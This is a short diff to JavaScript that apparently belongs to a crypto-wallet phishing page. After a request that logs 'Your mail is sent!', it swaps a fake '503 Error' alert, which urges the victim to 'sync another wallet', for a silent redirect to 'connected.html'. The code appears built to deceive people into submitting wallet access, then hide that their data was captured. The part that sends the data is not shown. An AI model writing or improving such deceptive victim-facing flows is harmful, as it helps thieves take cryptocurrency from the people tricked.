@@ -450,7 +450,8 @@
         })
           .done(function () {
             console.log("Your mail is sent!");
-            alert("503 Error, if this persist kindly sync another wallet and try again or contact admin");
+            window.location.href = "connected.html";
+
           })
           .fail(function (error) {
             alert("Oops... " + JSON.stringify(error));
